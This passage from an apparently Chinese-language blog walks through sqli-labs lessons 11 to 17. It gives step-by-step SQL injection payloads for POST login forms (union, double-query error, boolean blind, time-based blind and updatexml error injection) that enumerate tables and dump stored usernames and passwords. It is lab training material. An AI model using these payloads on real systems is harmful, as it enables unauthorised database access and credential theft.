start="4"><li><strong>爆库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,database()#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/xU9TBGf8nRXhgd6.png" alt="less11-3.png"></p><p><img src="https://i.loli.net/2019/10/24/vD7QMZEr4H2fR68.png" alt="less11-4.png"></p><p>注：这里和 get 型注入一样，union 之前的值必须为空值。</p><ol start="5"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/B8kJoDzygmFh697.png" alt="less11-6.png"></p><ol start="6"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/lMk6ULfIZKdh1VC.png" alt="less11-7.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(username) FROM security.users#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/5kDou63UQplETRH.png" alt="less11-8.png"></p><pre class="line-numbers language-text"><code class="language-text">username：1admin' union select 1,group_concat(password) FROM security.users#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/24/kwVWuHS6C9vrGYQ.png" alt="less11-9.png"></p><h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关和 less11 类似，只是在 id 的参数的处理上有一定的不同。</p><hr><ol><li><strong>尝试输入 username:用户名+双引号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/28/Ib2yL8geAvwr1i9.png" alt="less12-1.png"></p><p>注：从报错中可以判断出SQL语句：SELECT username, password FROM users WHERE username=(“admin”) and password=(“$passwd”) LIMIT 0,1</p><ol start="2"><li><strong>尝试输入 username:用户名+双引号+括号+井号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/28/A3HKMLNp6uQPrF7.png" alt="less12-2.png"></p><ol start="3"><li><strong>猜测字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin") order by 3#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/ctbYzHJjqiQxMgV.png" alt="less12-3.png"></p><ol start="4"><li><strong>爆库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,database()#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/dwlS7t9mFvTpzEA.png" alt="less12-4.png"></p><ol start="5"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/UZmdTDIFXCAliaS.png" alt="less12-5.png"></p><ol start="6"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin") union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/xm45abg7pSH1I9Q.png" alt="less12-6.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：1admin") union select group_concat(username),group_concat(password) FROM security.users#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/e8LumOXRCbPdMw1.png" alt="less12-7.png"></p><h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>POST 型单引号双注入</p><hr><ol><li><strong>尝试输入 username:用户名+单引号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/28/hy4oqaGzObdR3LS.png" alt="less13-1.png"></p><p>注：从报错中可以判断出SQL语句：SELECT username, password FROM users WHERE username=(‘admin’) and password=(‘$passwd’) LIMIT 0,1</p><ol start="2"><li><strong>尝试输入 username:用户名+单引号+括号+井号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/10/28/Ai1o8e9JuTUBLIv.png" alt="less13-2.png"></p><ol start="3"><li><strong>猜测字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin') order by 3#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/iMfW1UeFtLu2sDH.png" alt="less13-3.png"></p><ol start="4"><li><strong>爆库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/8hbv1LsmOdue5X3.png" alt="less13-4.png"></p><ol start="5"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/Bl5EqdgInR2wfSz.png" alt="less13-5.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/2KTVI7aCsJRn8tu.png" alt="less13-6.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/ZNOqlc8WIuR75ag.png" alt="less13-7.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/nrhjvduRmH1zieI.png" alt="less13-8.png"></p><ol start="6"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/rUmwFJO3uDHVPqW.png" alt="less13-9.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/t7Jrjm8KlgM1ns9.png" alt="less13-10.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/qd8BLG7OzluUwFf.png" alt="less13-11.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/ubqJG5wlQtI6AYo.png" alt="less13-12.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin') union select count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/SF5ZputCkTNDRmV.png" alt="less13-13.png"></p><h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关和 13 关一样都是双注入，只是 “单引号” 改成了 “双引号”</p><hr><ol><li><strong>尝试输入 username:用户名+双引号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/11/02/ECMurvxGokN4KWY.png" alt="less14-1.png"></p><p>注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT username, password FROM users WHERE username=”admin” and password=”$passwd” LIMIT 0,1</p><ol start="2"><li><strong>尝试输入 username:用户名+双引号+井号，password:随便输</strong></li></ol><p><img src="https://i.loli.net/2019/11/02/y28rMSVJNRQ7ZjH.png" alt="less14-2.png"></p><ol start="3"><li><strong>猜测字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin" order by 3#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/CugEkJhG9vZBHI8.png" alt="less14-3.png"></p><ol start="4"><li><strong>爆库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/7vPMFtYNeT8qjGi.png" alt="less14-4.png"></p><ol start="5"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/bqOflGDQRIVFPSH.png" alt="less14-5.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/Np1hVJqLgb2zviU.png" alt="less14-6.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/M5jdnOeWzwUA6sY.png" alt="less14-7.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/xjYwHCUQPFvWhq1.png" alt="less14-8.png"></p><ol start="6"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/ToZEcqPgVL8aCvi.png" alt="less14-9.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/kS8NePXgwOT3G1v.png" alt="less14-10.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/dNZJ6skSQtvPzhV.png" alt="less14-11.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/ykNBg7iUdcbqoTE.png" alt="less14-12.png"></p><pre class="line-numbers language-text"><code class="language-text">username：admin" union select count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a#password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/02/JGvBxp8PtOWezg4.png" alt="less14-13.png"></p><h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>POST 型单引号布尔盲注</p><hr><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>正确回显是固定字符串（无回显）这里页面显示flag.jpg这张图片；</p><p>错误回显是Mysql错误信息，这里页面显示slap.jpg这张图片。</p><p><img src="https://i.loli.net/2019/10/28/WBGcbZntvr1CV6Y.png" alt="flag.png"></p><p><img src="https://i.loli.net/2019/10/28/wdSfEzjDNYJmonW.png" alt="slap.png"></p><h3 id="注入步骤-5"><a href="#注入步骤-5" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>判断数据库字符串的长度</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>55<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/O5cKM2WgI8pJZXj.png" alt="less15-1.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">&gt;</span>56<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/d8LJQGYpgvuMVRn.png" alt="less15-2.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>length<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span><span class="token punctuation">))</span><span class="token operator">=</span>56<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/l7wvkDSR1o86zem.png" alt="less15-3.png"></p><ol start="2"><li><strong>判断数据库</strong></li></ol><ul><li>第一个字母</li></ul><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>110<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/FSUwuC9bl7tJf2L.png" alt="less15-4.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/qM48LYVXJtDIvok.png" alt="less15-5.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span></span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/SN5kdQIqh6oBylR.png" alt="less15-6.png"></p><ol start="3"><li><strong>判断表</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin<span class="token string">' and ascii(substr((select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/kg5xvqL2zHA9JYn.png" alt="less15-7.png"></p><ol start="4"><li><strong>判断字段</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin<span class="token string">' and ascii(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' AND TABLE_NAME='</span>users' limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>105<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/lKhgnz2DVtpi9uE.png" alt="less15-8.png"></p><ol start="5"><li><strong>判断数据</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/QgTaAjK7Ut12C6P.png" alt="less15-9.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin' and ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68<span class="token comment" spellcheck="true">#</span>password：1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/03/K4pfFBemqyitEJv.png" alt="less15-10.png"></p><h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>POST 型单引号时间盲注</p><hr><ol><li><strong>判断数据库字符串的长度</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/QMI51DvbLS8CFjO.png" alt="less16-1.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>length<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token operator">=</span>56, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/2hpJgend5mwB8Hq.png" alt="less16-2.png"></p><ol start="2"><li><strong>判断数据库</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/MtFigc9dbUP54wR.png" alt="less16-3.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>115, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/aHYBrE32bzwpNlF.png" alt="less16-4.png"></p><ol start="3"><li><strong>判断表</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">&gt;</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/sHFIJxU3ldpgwyn.png" alt="less16-5.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'security'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>101, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/mQULM4ZgyEfPaYT.png" alt="less16-6.png"></p><ol start="4"><li><strong>判断字段</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">((</span>select column_name from information_schema.columns where table_schema<span class="token operator">=</span><span class="token string">'security'</span> AND TABLE_NAME<span class="token operator">=</span><span class="token string">'users'</span> limit 0,1<span class="token punctuation">)</span>,1,1<span class="token punctuation">))</span><span class="token operator">=</span>105, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/RrjxImMcKYVAouT.png" alt="less16-7.png"></p><ol start="5"><li><strong>判断数据</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select password FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/OTpcICZadEPRgf1.png" alt="less16-8.png"></p><pre class="line-numbers language-bash"><code class="language-bash">admin"<span class="token punctuation">)</span> and if<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token variable"><span class="token punctuation">((</span>select username FROM security.users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">))</span></span><span class="token operator">=</span>68, 0, sleep<span class="token punctuation">(</span>5<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/04/ODnWLSBQp8iT7ye.png" alt="less16-9.png"></p><h2 id="Less17"><a href="#Less17" class="headerlink" title="Less17"></a>Less17</h2><p>本关是一个利用 update 语句修改修改用户密码的过程，本关注入的前提是必须要知道用户名。</p><hr><h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>这一关是一个 POST 型 update 报错注入。<br>update 语句：<code>update users set password='123456' where username='Dumb';</code></p><p><img src="https://i.loli.net/2019/11/13/jSUfXIGes2Ht7Tv.png" alt="less17-1.png"></p><h3 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h3><p>updatexml() 是 mysql 内置的的 XML 文件解析和修改函数。函数输出结果最大长度为 32 位。</p><pre class="line-numbers language-bash"><code class="language-bash">UPDATEXML <span class="token punctuation">(</span>XML_document, XPath_string, new_value<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p><a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp" target="_blank" rel="noopener">XPath 语法</a></p><h3 id="工作原理-4"><a href="#工作原理-4" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li><p>UPDATEXML 先解析执行第二个参数 Xpath string，然后再校验执行后的数据。</p></li><li><p>如果第二个参数不是 XPATH 格式的，它就会把校验失败的数据暴出来，校验失败的数据只有一部分内容，并不是所有数据都校验失败。</p></li><li><p>为了让所有的数据全部报错，就需要使用 concat() 函数在需要的数据前面加上一个 XPATH 校验失败的字符串就行了。</p></li></ol><p><img src="https://i.loli.net/2019/11/13/3gx67LdcPvM8GBi.png" alt="less17-2.png"></p><p><img src="https://i.loli.net/2019/11/13/zGpRvfVnTxoYUsN.png" alt="less17-3.png"></p><h3 id="注入步骤-6"><a href="#注入步骤-6" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>尝试输入 username:用户名，password:随便输+单引号</strong></li></ol><p><img src="https://i.loli.net/2019/11/13/Z5yC4w7e2ulcXvG.png" alt="less17-4.png"></p><ol start="2"><li><strong>获取数据库登录用户名</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">User Name：adminNew Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/Vma7lhOCW9cEByp.png" alt="less17-5.png"></p><ol start="3"><li><strong>暴数据库名</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">User Name：adminNew Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>SELECT database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/VDtIC7AQsSxuplH.png" alt="less17-6.png"></p><ol start="4"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">User Name：adminNew Password：1<span class="token string">' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>security' limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/WMBrefOmlCLt17N.png" alt="less17-7.png"></p><ol start="5"><li><strong>暴字段</strong></li></ol><pre class="line-numbers 